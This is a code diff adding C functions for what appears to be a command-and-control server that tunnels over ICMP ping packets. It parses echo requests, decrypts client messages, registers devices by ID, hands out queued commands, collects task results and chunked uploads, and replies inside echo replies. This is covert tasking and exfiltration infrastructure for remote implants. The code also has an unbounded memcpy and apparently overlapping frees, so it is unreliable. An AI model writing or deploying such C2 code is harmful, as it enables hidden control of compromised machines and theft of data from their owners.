@@ -422,6 +422,123 @@ int handle_chunk(struct Client *client, const unsigned char *chunk_body, size_t 
 
 }
 
+ssize_t receive_echo_request(int fd, unsigned char *received_request_data, struct in_addr *sender_ip, uint16_t *identifier, uint16_t *sequence) {
+
+	unsigned char request[2048];
+	struct sockaddr_in sender = {0};
+	socklen_t sender_length = sizeof(sender);
+	ssize_t received_length = recvfrom(fd, request, sizeof(request), 0, (struct sockaddr *)&sender, &sender_length);
+	if (received_length < 0) {
+		return -1;
+	}
+
+	size_t request_length = (size_t)received_length;
+	size_t ip_header_length = (request[0] & 0x0f) * 4;
+	if (request_length < ip_header_length + 8) {
+		return -1;
+	}
+
+	unsigned char *echo_request = request + ip_header_length;
+	if (echo_request[0] != ICMP_ECHO || echo_request[1] != 0 || calculate_checksum(echo_request, request_length - ip_header_length) != 0) {
+		return -1;
+	}
+
+	*sender_ip = sender.sin_addr;
+	*identifier = (uint16_t)((echo_request[4] << 8) | echo_request[5]);
+	*sequence = (uint16_t)((echo_request[6] << 8) | echo_request[7]);
+
+	size_t request_data_length = request_length - ip_header_length - 8;
+	memcpy(received_request_data, echo_request + 8, request_data_length);
+
+	return (ssize_t)request_data_length;
+
+}
+
+int send_echo_reply(int fd, struct in_addr destination_ip, uint16_t identifier, uint16_t sequence, const unsigned char *data_to_send, size_t data_to_send_length) {
+
+	struct sockaddr_in destination = {0};
+	destination.sin_family = AF_INET;
+	destination.sin_addr = destination_ip;
+
+	unsigned char reply[8 + MAX_PAYLOAD_SIZE] = {0};
+	reply[0] = ICMP_ECHOREPLY;
+	reply[4] = (unsigned char)(identifier >> 8);
+	reply[5] = (unsigned char)identifier;
+	reply[6] = (unsigned char)(sequence >> 8);
+	reply[7] = (unsigned char)sequence;
+	if (data_to_send_length > MAX_PAYLOAD_SIZE) {
+		return -1;
+	}
+	memcpy(reply + 8, data_to_send, data_to_send_length);
+	uint16_t checksum = calculate_checksum(reply, 8 + data_to_send_length);
+	reply[2] = (unsigned char)(checksum >> 8);
+	reply[3] = (unsigned char)checksum;
+
+	sendto(fd, reply, 8 + data_to_send_length, 0, (struct sockaddr *)&destination, sizeof(destination));
+
+	return 0;
+
+}
+
+unsigned char *handle_client_message(const unsigned char *received_request_data, size_t received_request_data_length, size_t *reply_message_length) {
+
+	size_t received_message_length = 0;
+	unsigned char *received_message = decrypt_uncompress(received_request_data, received_request_data_length, &received_message_length);
+	if (received_message == NULL) {
+		return NULL;
+	}
+
+	uint8_t received_message_type = 0;
+	uint64_t received_device_id = 0;
+	unsigned char *received_message_body = NULL;
+	size_t received_message_body_length = 0;
+	if (parse_message(received_message, received_message_length, &received_message_type, &received_device_id, &received_message_body, &received_message_body_length) != 0) {
+		free(received_message);
+		return NULL;
+	}
+
+	struct Client *client = register_client(received_device_id);
+
+	uint8_t reply_message_type = MESSAGE_EMPTY;
+	unsigned char *reply_message_body = NULL;
+	size_t reply_message_body_length = 0;
+	struct Task *reply_task = NULL;
+	if (received_message_type == MESSAGE_REGISTER || received_message_type == MESSAGE_POLL) {
+		reply_task = move_to_next_task(client);
+		if (reply_task != NULL) {
+			reply_message_type = MESSAGE_TASK;
+			reply_message_body = reply_task->command;
+			reply_message_body_length = reply_task->command_length;
+		}
+	}
+	if (received_message_type == MESSAGE_TASK_RESULT) {
+		add_task_result(client, received_message_body, received_message_body_length);
+		received_message_body = NULL;
+	}
+	if (received_message_type == MESSAGE_ANNOUNCE_CHUNKED) {
+		handle_chunked_transfer_announcement(client, received_message_body, received_message_body_length);
+	}
+	if (received_message_type == MESSAGE_CHUNK) {
+		unsigned char *ack_body = NULL;
+		size_t ack_body_length = 0;
+		if (handle_chunk(client, received_message_body, received_message_body_length, &ack_body, &ack_body_length) >= 0) {
+			reply_message_type = MESSAGE_ACK;
+			reply_message_body = ack_body;
+			reply_message_body_length = ack_body_length;
+		}
+	}
+
+	unsigned char *reply_message = build_message(reply_message_type, received_device_id, reply_message_body, reply_message_body_length, reply_message_length);
+
+	free(reply_message_body);
+	free(reply_task);
+	free(received_message);
+	free(received_message_body);
+
+	return reply_message;
+
+}
+
 int main() {
 
 	return 0;
